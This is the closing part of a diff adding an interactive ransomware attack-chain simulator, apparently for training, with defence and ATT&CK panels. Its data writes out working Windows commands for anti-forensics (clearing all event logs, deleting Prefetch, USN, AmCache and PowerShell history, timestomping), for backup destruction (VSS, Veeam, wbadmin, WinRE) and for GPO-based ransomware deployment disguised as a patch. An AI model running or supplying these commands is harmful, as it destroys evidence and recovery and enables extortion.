+{t:"c",x:'C:\\> powershell "Get-WinEvent -ListLog * -Force -EA Silent | ForEach { try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {} }"',d:400},
+{t:"o",x:"Clearing 437 event log channels on DC01...",d:300},
+{t:"a",x:"[+] DC01: ALL 437 event log channels CLEARED",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Stop and disable Windows Event Log service"},
+{t:"c",x:'C:\\> sc stop EventLog\nC:\\> reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog" /v Start /t REG_DWORD /d 4 /f',d:300},
+{t:"a",x:"[+] EventLog service STOPPED and DISABLED on DC01",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Push log clearing + EventLog disable to ALL domain computers"},
+{t:"c",x:'C:\\> Invoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {\n  wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null }\n  Stop-Service EventLog -Force -EA Silent\n  Set-Service EventLog -StartupType Disabled -EA Silent\n} -EA Silent',d:500},
+{t:"o",x:"Executing on 342 computers...",d:500},
+{t:"a",x:"[+] Event logs CLEARED and EventLog service DISABLED on ALL 342 systems",d:200},
+]},
+{nm:"Filesystem Artifact Destruction",C:[
+{t:"cc",x:"# ═══ PHASE 4: DESTROY FILESYSTEM FORENSIC ARTIFACTS ═══"},
+{t:"cc",x:"# Each artifact type tells IR teams something different:"},
+{t:"cc",x:"#   Prefetch → what programs ran and when"},
+{t:"cc",x:"#   USN Journal → every NTFS file change"},
+{t:"cc",x:"#   ShimCache/AmCache → program execution with hashes"},
+{t:"cc",x:"#   PS history → every PowerShell command typed"},
+{t:"d",x:""},
+{t:"cc",x:"# 1. Delete Prefetch (program execution evidence)"},
+{t:"c",x:"C:\\> del /q /f C:\\Windows\\Prefetch\\*.pf 2>nul",d:200},
+{t:"a",x:"[+] Prefetch: all .pf files deleted",d:120},
+{t:"d",x:""},
+{t:"cc",x:"# 2. Destroy USN Journal (NTFS file change tracking)"},
+{t:"c",x:"C:\\> fsutil usn deletejournal /d C:",d:250},
+{t:"a",x:"[+] USN Journal ($UsnJrnl): destroyed",d:120},
+{t:"d",x:""},
+{t:"cc",x:"# 3. Clear PowerShell command history"},
+{t:"c",x:'C:\\> del /q /f "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>nul',d:200},
+{t:"c",x:'C:\\> powershell "[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()"',d:200},
+{t:"a",x:"[+] PowerShell history: cleared",d:120},
+{t:"d",x:""},
+{t:"cc",x:"# 4. Delete ShimCache / AppCompatCache"},
+{t:"c",x:'C:\\> reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache" /v AppCompatCache /f 2>nul',d:200},
+{t:"a",x:"[+] ShimCache / AppCompatCache: deleted",d:120},
+{t:"d",x:""},
+{t:"cc",x:"# 5. Delete AmCache (program execution + SHA1 hashes)"},
+{t:"c",x:'C:\\> del /q /f "C:\\Windows\\AppCompat\\Programs\\Amcache.hve" 2>nul',d:200},
+{t:"a",x:"[+] AmCache: deleted",d:120},
+{t:"d",x:""},
+{t:"cc",x:"# 6. Clear RDP Bitmap Cache (screenshots of RDP sessions)"},
+{t:"c",x:'C:\\> del /q /f "%LOCALAPPDATA%\\Microsoft\\Terminal Server Client\\Cache\\*" 2>nul',d:200},
+{t:"a",x:"[+] RDP bitmap cache: cleared",d:120},
+{t:"d",x:""},
+{t:"cc",x:"# 7. Clear Recent Items, Jump Lists, UserAssist"},
+{t:"c",x:'C:\\> del /q /f "%APPDATA%\\Microsoft\\Windows\\Recent\\*" "%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*" 2>nul',d:200},
+{t:"c",x:'C:\\> reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist" /f 2>nul',d:200},
+{t:"a",x:"[+] Recent Items, Jump Lists, UserAssist: cleared",d:120},
+{t:"d",x:""},
+{t:"cc",x:"# 8. Timestomp attacker tools to match legitimate OS file timestamps"},
+{t:"c",x:'C:\\> powershell "$ref=Get-Item C:\\Windows\\System32\\drivers\\ndis.sys; @(\'C:\\ProgramData\\vuln_driver.sys\',\'C:\\ProgramData\\WindowsUpdate\\svchost_update.exe\') | %{ $f=Get-Item $_; $f.CreationTime=$ref.CreationTime; $f.LastWriteTime=$ref.LastWriteTime; $f.LastAccessTime=$ref.LastAccessTime }"',d:350},
+{t:"a",x:"[+] Timestomped: attacker files match ndis.sys (2019 timestamps)",d:150},
+{t:"d",x:""},
+{t:"tb",x:"[+] ████ ALL FORENSIC ARTIFACTS DESTROYED ████",d:200},
+{t:"d",x:""},
+{t:"i",x:"[ANTI-FORENSICS COMPLETE — T+3h 45m]",d:100},
+{t:"i",x:"  EDR/AV killed on 342 systems (Defender + CrowdStrike)",d:80},
+{t:"i",x:"  ETW patched | AMSI bypassed | PS logging disabled | Sysmon removed",d:80},
+{t:"i",x:"  437 event log channels cleared per system | EventLog service disabled",d:80},
+{t:"i",x:"  Prefetch, USN, ShimCache, AmCache, PS history, RDP cache — destroyed",d:80},
+{t:"i",x:"  Attacker tool timestamps manipulated",d:80},
+{t:"i",x:"  → IR teams find zero evidence trail. Proceeding to ransomware.",d:80},
+]}],
+N:{attacker:"active",firewall:"compromised",lan:"compromised",ad:"compromised",fs:"compromised"},
+I:[{l:"EDR Status",v:"KILLED (342)"},{l:"ETW",v:"PATCHED (0xC3)"},{l:"AMSI",v:"BYPASSED"},{l:"Event Logs",v:"ALL CLEARED"},{l:"Sysmon",v:"DESTROYED"},{l:"Artifacts",v:"ALL WIPED"}],
+W:["Destroy all backup infrastructure and VSS snapshots","Deploy ransomware to 342 systems via Group Policy","Encrypt everything and drop ransom note"],
+T:["T1562.001 — Disable Security Tools (EDR/AV)","T1562.002 — Disable Event Logging","T1562.006 — Indicator Blocking (ETW patch)","T1070.001 — Clear Windows Event Logs","T1070.004 — File Deletion (artifacts)","T1070.006 — Timestomp"],
+D:["Forward logs to immutable external SIEM in real-time","Detect ETW patch: monitor WriteProcessMemory on ntdll","Protected Process Light (PPL) for EDR agents","Kernel-mode driver blocklist via WDAC/HVCI","Alert on EventLog service stop (Event ID 1100)","Store USN journal snapshots on write-once storage"]
+},
+
+// ━━━ STAGE 8: RANSOMWARE DEPLOYMENT ━━━
+// Real flow: The final act. Destroy all backups, deploy via GPO,
+// encrypt everything, drop the ransom note.
+{id:"ransomware",nm:"Ransomware Deploy",ic:"🔐",m:"TA0040",sub:"Backup Destruction → Mass Encryption → Ransom",
+ds:"The final stage. With all defenses neutralized and evidence destroyed, the attacker destroys every backup and recovery mechanism — VSS snapshots, Veeam repositories, Windows Backup catalogs, Windows Recovery Environment. Then ransomware is deployed to all 342 domain systems via a malicious GPO disguised as a critical security update. 3.1 million files encrypted with ChaCha20 + RSA-4096.",
+ob:"<b>GOAL:</b> Maximum impact: (1) Destroy ALL backups (VSS, Veeam, WBAdmin, WinRE), (2) Deploy ransomware to 342 systems via GPO, (3) Encrypt 3.1M+ files, (4) Drop double-extortion ransom note.",
+tl:"CORP\\Administrator@DC01 C:\\>",
+P:[
+{nm:"Backup Destruction",C:[
+{t:"cc",x:"# ═══ PHASE 1: DESTROY ALL RECOVERY MECHANISMS ═══"},
+{t:"cc",x:"# Every backup type must be destroyed or victim can recover without paying"},
+{t:"a",x:"[!] COMMENCING BACKUP DESTRUCTION",d:250},
+{t:"d",x:""},
+{t:"cc",x:"# 1. Delete VSS shadow copies on all servers"},
+{t:"c",x:'C:\\> Invoke-Command -ComputerName DC01,DC02,FS01,SQL01,BACKUP01 -ScriptBlock { vssadmin delete shadows /all /quiet 2>$null }',d:350},
+{t:"o",x:"DC01: 3 shadows deleted | DC02: 1 deleted | FS01: 5 deleted",d:150},
+{t:"o",x:"SQL01: 2 deleted | BACKUP01: 4 deleted",d:150},
+{t:"a",x:"[+] VSS shadow copies DESTROYED on all servers",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# 2. Destroy Veeam backup repository"},
+{t:"c",x:'C:\\> Invoke-Command -Computer BACKUP01 -ScriptBlock {\n  Stop-Service VeeamBackupSvc,VeeamBrokerSvc -Force\n  Remove-Item F:\\VeeamBackup\\* -Recurse -Force\n  Remove-Item "C:\\Program Files\\Veeam\\Backup and Replication\\*" -Recurse -Force\n}',d:400},
+{t:"a",x:"[+] Veeam: services stopped, 54.7 GB repository DESTROYED",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# 3. Delete Windows Backup catalogs"},
+{t:"c",x:'C:\\> Invoke-Command -Computer BACKUP01 -ScriptBlock { wbadmin delete catalog -quiet 2>$null }',d:250},
+{t:"c",x:'C:\\> Invoke-Command -Computer BACKUP01 -ScriptBlock { Remove-Item E:\\WindowsImageBackup -Recurse -Force }',d:250},
+{t:"a",x:"[+] Windows Backup: catalog deleted, 14 daily images DESTROYED",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# 4. Disable VSS + WBEngine services + Windows Recovery Environment"},
+{t:"c",x:'C:\\> Invoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {\n  sc.exe config vss start=disabled 2>$null\n  sc.exe config wbengine start=disabled 2>$null\n  bcdedit /set {default} recoveryenabled no 2>$null\n  bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>$null\n} -EA Silent',d:400},
+{t:"a",x:"[+] VSS, WBEngine DISABLED + WinRE DISABLED on 342 systems",d:200},
+{t:"s",x:"[+] ALL recovery mechanisms DESTROYED — no rollback possible",d:200},
+]},
+{nm:"GPO Payload Deployment",C:[
+{t:"cc",x:"# ═══ PHASE 2: DEPLOY RANSOMWARE VIA GROUP POLICY ═══"},
+{t:"cc",x:"# SYSVOL replicates to all DCs → every domain computer gets the payload"},
+{t:"cc",x:"# GPO named to look like a legitimate Microsoft security patch"},
+{t:"d",x:""},
+{t:"c",x:"C:\\> copy /Y ransomware.exe \\\\DC01\\SYSVOL\\corp.dawnridge.example\\scripts\\svchost_update.exe",d:250},
+{t:"o",x:"        1 file(s) copied to SYSVOL",d:100},
+{t:"d",x:""},
+{t:"c",x:'C:\\> powershell "New-GPO -Name \'Security Update KB5034441 - Critical\' | New-GPLink -Target \'DC=corp,DC=dawnridge,DC=example\' -Enforced Yes"',d:350},
+{t:"o",x:"GPO: 'Security Update KB5034441 - Critical' → linked to domain root, ENFORCED",d:200},
+{t:"d",x:""},
+{t:"c",x:'C:\\> powershell "Set-GPRegistryValue -Name \'Security Update KB5034441 - Critical\' -Key \'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\' -ValueName \'SecurityPatch\' -Type String -Value \'\\\\corp.dawnridge.example\\SYSVOL\\corp.dawnridge.example\\scripts\\svchost_update.exe --encrypt-all --note README.txt\'"',d:400},
+{t:"o",x:"GPO Run key set — executes on next Group Policy refresh cycle",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Force immediate Group Policy refresh on all computers"},
+{t:"c",x:'C:\\> Invoke-GPUpdate -Computer (Get-ADComputer -Filter *).Name -Force -RandomDelayInMinutes 0',d:350},
+{t:"o",x:"Forcing GP refresh on 342 computers...",d:300},
+{t:"a",x:"[+] Ransomware deployed via GPO to ALL 342 domain systems",d:200},
+]},
+{nm:"Mass Encryption & Ransom Note",C:[
+{t:"cc",x:"# ═══ PHASE 3: ENCRYPTION EXECUTING ACROSS ENTIRE DOMAIN ═══"},
+{t:"d",x:""},
+{t:"tb",x:"[██] ████ RANSOMWARE EXECUTING ████",d:250},
+{t:"d",x:""},
+{t:"a",x:"[ENCRYPT] DC01     — 14,231 files (.blacksuit extension)",d:100},
+{t:"a",x:"[ENCRYPT] DC02     — 11,847 files",d:100},
+{t:"a",x:"[ENCRYPT] FS01     — 142,558 files (Finance$, HR$, Legal$, Executive$)",d:100},
+{t:"a",x:"[ENCRYPT] SQL01    — 89,201 files (.mdf, .ldf, .bak databases)",d:100},
+{t:"a",x:"[ENCRYPT] BACKUP01 — 12,344 files (.vhd, .vmdk, .vbk remnants)",d:100},
+{t:"a",x:"[ENCRYPT] 337 Workstations — 2,847,102 files",d:200},
+{t:"d",x:""},
+{t:"o",x:"Crypto: ChaCha20 (per-file symmetric) + RSA-4096 (key wrap)",d:100},
+{t:"o",x:"Total:  3,117,283 files encrypted across 342 systems",d:100},
+{t:"d",x:""},
+{t:"tb",x:"╔═══════════════════════════════════════════════════════════╗",d:40},
+{t:"tb",x:"║          YOUR NETWORK HAS BEEN ENCRYPTED                  ║",d:40},
+{t:"tb",x:"║                                                           ║",d:40},
+{t:"tb",x:"║  All files on 342 computers are encrypted.                ║",d:40},
+{t:"tb",x:"║  42.2 GB of confidential data has been exfiltrated:       ║",d:40},
+{t:"tb",x:"║    • Financial records, tax filings, bank statements      ║",d:40},
+{t:"tb",x:"║    • Employee PII, salary data, HR records                ║",d:40},
+{t:"tb",x:"║    • Legal documents, contracts, board strategy           ║",d:40},
+{t:"tb",x:"║                                                           ║",d:40},
+{t:"tb",x:"║  Pay within 72 hours or data published on leak site.      ║",d:40},
+{t:"tb",x:"║                                                           ║",d:40},
+{t:"tb",x:"║  Contact: http://[REDACTED].onion                         ║",d:40},
+{t:"tb",x:"║  ID: DRI-2025-0228-XXXX                                   ║",d:40},
+{t:"tb",x:"╚═══════════════════════════════════════════════════════════╝",d:40},
+{t:"d",x:""},
+{t:"tb",x:"█████████████████████████████████████████████████████████████",d:100},
+{t:"tb",x:"██  ATTACK COMPLETE — 342 SYSTEMS — 3.1M FILES ENCRYPTED  ██",d:100},
+{t:"tb",x:"██  42.2 GB EXFILTRATED — DOUBLE EXTORTION ACTIVE         ██",d:100},
+{t:"tb",x:"██  TOTAL DWELL TIME: ~4 HOURS (EXPLOIT → ENCRYPTION)     ██",d:100},
+{t:"tb",x:"██  ALL BACKUPS DESTROYED — ALL LOGS CLEARED              ██",d:100},
+{t:"tb",x:"██  IR FINDS: ZERO FORENSIC EVIDENCE                      ██",d:100},
+{t:"tb",x:"█████████████████████████████████████████████████████████████",d:100},
+]}],
+N:{attacker:"active",firewall:"compromised",lan:"encrypted",ad:"encrypted",fs:"encrypted"},
+I:[{l:"Systems Hit",v:"342"},{l:"Files Encrypted",v:"3.1M+"},{l:"Ransomware",v:"BlackSuit"},{l:"Crypto",v:"ChaCha20+RSA4096"},{l:"Backups",v:"ALL DESTROYED"},{l:"Dwell Time",v:"~4 hours"}],
+W:["Victim must decide: pay ransom or rebuild from scratch","Incident Response, forensics, legal counsel required","CERT-In 6-hour incident reporting mandate activated"],
+T:["T1490 — Inhibit System Recovery","T1489 — Service Stop (VSS, Veeam)","T1484.001 — Group Policy Modification","T1486 — Data Encrypted for Impact"],
+D:["Offline, air-gapped, immutable backups (3-2-1-1-0 rule)","Application whitelisting / WDAC on all servers","Real-time GPO change monitoring and alerting","Ransomware canary files in every share","CERT-In: 6-hour mandatory incident reporting","Tabletop exercises: practice ransomware response quarterly"]
+}
+];
+
+// ═══ ENGINE ═══
+let CS=0,CP=0,VL=0,PL=false,SP=1,DF=false,DN=new Set(),TM=null;
+const SCOL={active:"#58a6ff",target:"#d29922",compromised:"#f87171",encrypted:"#da3633",visible:"#484f58",hidden:"transparent"};
+const NN=[{id:"attacker",l:"Threat Actor\n198.51.100.44",x:35,y:42,i:"☠️"},{id:"firewall",l:"FortiGate-200F\n203.0.113.1",x:120,y:42,i:"🔥"},{id:"lan",l:"Internal LAN\n10.10.0.0/16",x:210,y:42,i:"🖥️"},{id:"ad",l:"DC01/DC02\nActive Directory",x:165,y:120,i:"🏛️"},{id:"fs",l:"FS01/BACKUP01\nFile Servers",x:260,y:120,i:"💾"}];
+const NE=[{f:"attacker",t:"firewall"},{f:"firewall",t:"lan"},{f:"lan",t:"ad"},{f:"lan",t:"fs"}];
+const CLS={c:"tl tc",o:"tl to",i:"tl ti",w:"tl tw",a:"tl ta",s:"tl ts",cc:"tl tcc",tb:"tl tb",d:"tl tdd"};
+
+function R(){
+const s=S[CS],p=s.P[CP],cmds=p.C;
+document.getElementById("hm").textContent=s.m;
+document.getElementById("hs").textContent=CS+1;
+// KC nav
+const kn=document.getElementById("kcn");kn.innerHTML="";
+S.forEach((st,i)=>{const b=document.createElement("button");b.className="ks"+(i===CS?" a":"")+(DN.has(st.id)?(st.id==="ransomware"?" enc":" dn"):"");b.innerHTML=`<em>${st.ic}</em><span>${st.nm}</span>`;b.onclick=()=>goS(i);kn.appendChild(b);});
+// Stage bar
+document.getElementById("stb").innerHTML=`<div class="sr"><span class="si">${s.ic}</span><div><div class="sn">${s.nm}</div><div class="ss">${s.sub}</div></div><button class="stog" onclick="document.querySelectorAll('.sd,.so').forEach(e=>e.classList.toggle('vis'))">▼ Details</button></div><div class="sd">${s.ds}</div><div class="so">${s.ob}</div>`;
+// Phase tabs
+const pt=document.getElementById("ptabs");pt.innerHTML="";
+s.P.forEach((ph,i)=>{const b=document.createElement("button");b.className="ptb"+(i===CP?" a":"");b.textContent=`Phase ${i+1}: ${ph.nm}`;b.onclick=()=>{CP=i;VL=0;PL=false;clearTimeout(TM);R();};pt.appendChild(b);});
+// Terminal
+const trm=document.getElementById("trm");trm.innerHTML='<div class="sc"></div>';
+for(let i=0;i<VL&&i<cmds.length;i++){const l=cmds[i],d=document.createElement("div");d.className=CLS[l.t]||"tl to";d.textContent=l.t==="d"?"─────────────────────────────────────────────────":l.x;trm.appendChild(d);}
+if(PL&&VL<cmds.length){const c=document.createElement("span");c.className="cur";c.textContent="▌";trm.appendChild(c);}
+trm.scrollTop=trm.scrollHeight;
+// Play btn
+const pb=document.getElementById("bpl");
+if(PL){pb.className="b bp";pb.textContent="⏸ PAUSE";pb.onclick=doPa;}
+else{pb.className="b br";pb.textContent=VL>=cmds.length?"⟳ REPLAY":"▶ EXECUTE";pb.onclick=doPl;}
+// Progress
+const pct=cmds.length?(VL/cmds.length)*100:0;const pf=document.getElementById("pf");pf.style.width=pct+"%";pf.className="pf"+(pct>=100?" ok":"");
+// Speed
+document.querySelectorAll(".sp").forEach(b=>{b.className="sp"+(parseFloat(b.textContent)===SP?" on":"");});
+// Nav
+document.getElementById("bp").disabled=CS===0;document.getElementById("bnx").disabled=CS===S.length-1;
+// Network
+const nm=document.getElementById("nm");nm.querySelectorAll(".nd").forEach(n=>n.remove());
+const svg=document.getElementById("ns");svg.innerHTML="";
+const ns=VL>0?s.N:(CS>0?S[CS-1].N:S[0].N);
+NE.forEach(e=>{const f=NN.find(n=>n.id===e.f),t=NN.find(n=>n.id===e.t);if(ns[e.t]==="hidden")return;const l=document.createElementNS("http://www.w3.org/2000/svg","line");l.setAttribute("x1",f.x);l.setAttribute("y1",f.y);l.setAttribute("x2",t.x);l.setAttribute("y2",t.y);l.setAttribute("stroke",SCOL[ns[e.t]]||"#21262d");l.setAttribute("stroke-width","1.5");l.setAttribute("opacity","0.5");if(ns[e.t]==="visible")l.setAttribute("stroke-dasharray","5,3");svg.appendChild(l);});
+NN.forEach(n=>{const st=ns[n.id];if(st==="hidden")return;const d=document.createElement("div");d.className="nd"+(st==="encrypted"?" ep":"");d.style.cssText=`left:${n.x-44}px;top:${n.y-22}px`;const cl=SCOL[st]||"#484f58";d.innerHTML=`<i>${st==="encrypted"?"🔐":n.i}</i><s style="color:${cl};border:1px solid ${cl}22;background:${cl}08">${n.l}</s>`;nm.appendChild(d);});
+// Right panel
+document.getElementById("ig").innerHTML=s.I.map(i=>`<div class="ic"><div class="il">${i.l}</div><div class="iv">${i.v}</div></div>`).join("");
+document.getElementById("ws").innerHTML=`<div class="st" style="color:#d29922">🎯 What Attacker Does Next</div>`+s.W.map((w,i)=>`<div class="wi">${i+1}. ${w}</div>`).join("");
+const db=document.getElementById("bdf");db.className="bd "+(DF?"on":"off");db.textContent="🛡️ "+(DF?"Hide":"Show")+" Blue Team Defenses";
+document.getElementById("dc").innerHTML=DF?s.D.map(d=>`<div class="dt">✓ ${d}</div>`).join(""):'<div class="st" style="margin-bottom:5px">MITRE ATT&CK</div>'+s.T.map(t=>`<div class="tt">${t}</div>`).join("");
+}
+
+function goS(i){if(i<0||i>=S.length)return;CS=i;CP=0;VL=0;PL=false;DF=false;clearTimeout(TM);R();}
+function tgD(){DF=!DF;R();}
+function sS(v){SP=v;R();}
+function pN(){const cmds=S[CS].P[CP].C;VL++;if(VL>=cmds.length){PL=false;DN.add(S[CS].id);R();return;}R();TM=setTimeout(pN,(cmds[VL]?.d||120)/SP);}
+function doPl(){const cmds=S[CS].P[CP].C;if(VL>=cmds.length)VL=0;PL=true;R();TM=setTimeout(pN,(cmds[VL]?.d||120)/SP);}
+function doPa(){PL=false;clearTimeout(TM);R();}
+function doSk(){PL=false;clearTimeout(TM);VL=S[CS].P[CP].C.length;DN.add(S[CS].id);R();}
+function doRs(){PL=false;clearTimeout(TM);VL=0;R();}
+R();
+</script>
+</body>
+</html>
